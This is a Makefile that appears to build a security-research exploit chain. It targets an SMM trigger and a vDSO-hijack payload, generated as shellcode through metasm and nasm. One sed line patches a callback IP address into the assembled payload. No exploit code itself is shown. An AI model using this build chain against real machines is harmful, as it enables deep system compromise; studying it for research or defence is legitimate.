CFLAGS=-W -Wall

all: smm-trigger-local trigger_smi

trigger_smi: trigger_smi.o
	$(CC) -o $@ $^ $(LDFLAGS)

smm-trigger-local: smm-trigger-local.o
	$(CC) -o $@ $^ $(LDFLAGS)

smm-trigger-local.o: smm-trigger-local.c hijack_vdso.h
	$(CC) -o $@ -c $< $(CFLAGS)

hijack_vdso.h: hijack_vdso.raw
	xxd -i $^ $@

hijack_vdso.raw: hijack_vdso.c payload.h
	RUBYLIB=$(HOME)/metasm ruby shellcode.rb $< $@

payload.h: payload.o
	xxd -i $^ $@

payload.o: payload.s
	nasm -f bin -o $@ $^
	sed -i 's/127\.000\.000\.001/192.168.122.1/' $@

%.o: %.c
	$(CC) -o $@ -c $< $(CFLAGS)

clean:
	rm -f *.o trigger_smi smm-trigger-local payload.h hijack_vdso.raw hijack_vdso.h
	$(MAKE) -C vdso-test clean
